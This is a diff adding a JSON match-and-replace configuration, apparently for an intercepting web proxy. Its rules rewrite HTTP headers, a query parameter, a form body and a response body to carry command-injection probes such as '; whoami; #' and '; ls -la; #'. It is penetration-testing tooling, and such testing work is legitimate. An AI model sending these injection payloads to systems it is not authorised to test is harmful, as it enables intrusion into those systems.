@@ -1,0 +1,86 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Inject command payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*$",
+                "string_replace": "Referer: '; echo vulnerable; #"
+            },
+            {
+                "comment": "Inject command payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^User-Agent:.*$",
+                "string_replace": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ; echo vulnerable; #"
+            },
+            {
+                "comment": "Inject command payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Cookie:.*$",
+                "string_replace": "Cookie: session=123456; test='; ls -la; #"
+            },
+            {
+                "comment": "Inject command payload in query parameter",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "id=.*$",
+                "string_replace": "id=1'; ls -la; #"
+            },
+            {
+                "comment": "Inject command payload in POST body (for form submission)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "<form>.*</form>",
+                "string_replace": "<form><input type='text' name='username' value='admin'; whoami; #'></form>"
+            },
+            {
+                "comment": "Inject command payload in URI fragment",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Fragment:.*$",
+                "string_replace": "Fragment: '; id; #"
+            },
+            {
+                "comment": "Inject command payload in X-Forwarded-For header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Forwarded-For:.*$",
+                "string_replace": "X-Forwarded-For: 127.0.0.1, '; uname -a; #'"
+            },
+            {
+                "comment": "Inject command payload in Accept-Language header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Accept-Language:.*$",
+                "string_replace": "Accept-Language: en-US, '; whoami; #'"
+            },
+            {
+                "comment": "Inject command payload in Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization: Basic YWRtaW46cGFzc3dvcmQ=; '; id; #'"
+            },
+            {
+                "comment": "Inject command payload in response body (test response manipulation)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "response_body",
+                "string_match": "<body>.*</body>",
+                "string_replace": "<body><h1>Command Injection Test</h1>; ls -la; #</body>"
+            }
+        ]
+    }
+}
